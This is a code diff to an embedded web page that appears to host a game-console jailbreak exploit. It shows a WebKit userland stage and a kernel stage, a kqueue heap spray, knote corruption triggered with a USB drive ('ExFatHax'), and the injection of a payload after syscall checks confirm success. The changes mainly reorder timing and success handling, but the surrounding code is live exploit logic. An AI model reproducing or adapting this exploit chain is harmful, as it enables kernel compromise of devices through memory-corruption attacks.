@@ -1,7 +1,7 @@
 static const char loaderData[] PROGMEM = R"==(
 <!DOCTYPE html><html>
 <head>
-<title>Payload</title>
+<title>Loader</title>
 <meta name=viewport content="width=device-width, initial-scale=1">
 <style>body{color:white;font-size:20px;text-align:center;margin:0;overflow:hidden;}.info{overflow: hidden;position: fixed;position: absolute;top: 45%;left: 50%;font-size: 25px;font-family: sans-serif;color: #b8b8b8;transform: translate(-50%, -50%);}</style>
 <script>
@@ -589,16 +589,22 @@ function injectPayload() //dynamic payload inject - stooged
 }
 
 
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
 
 function run_hax() {
     userland();
     if (chain.syscall(23, 0).low != 0x0) {
        kernel();
-	   //this wk exploit is pretty stable we can probably afford to kill webkit before payload loader but should we?.
+       //this wk exploit is pretty stable we can probably afford to kill webkit before payload loader but should we?.
     }
-	// load payload mod v2  - stooged
-	showMessage("Loading " + payloadTitle + "...");
-	setTimeout(injectPayload, 3000);
+    else
+    {
+       showMessage("Loading " + payloadTitle + "...");
+       setTimeout(injectPayload, 3000);
+    }
 }
 
 
@@ -887,22 +893,29 @@ var trigger_spray = function () {
     chain.run();
 
     //Trigger OOB
+
+    alert("Insert The USB Drive And Click OK When You See The Popup Notification");
+    showMessage("Loading ExFatHax...");
 	
-	alert("Insert The USB Drive And Click OK When You See The Popup Notification");
-	
-    //Trigger corrupt knote
-    {
+    sleep(3000).then(() => {
+        //Trigger corrupt knote
+        {
         for (var i = 1; i < NUM_KQUEUES; i += 2) {
             chain.fcall(window.syscalls[6], kqueues[i]);
         }
-    }
-    chain.run();
-	if (chain.syscall(23, 0).low == 0) {
-		return;
-	}
-	alert("failed to trigger exploit kernel heap might be corrupted, try again or reboot the console");
-    p.write8(0, 0);
-	return;
+        }
+        chain.run();
+
+        if (chain.syscall(23, 0).low == 0) {
+            showMessage("Loading " + payloadTitle + "...<br>Remove the USB Drive.");
+            setTimeout(injectPayload, 3000);
+        }
+        else
+        {
+            alert("failed to trigger exploit kernel heap might be corrupted, try again or reboot the console");
+            p.write8(0, 0);
+        }
+    });
 }
 </script>
 <script>
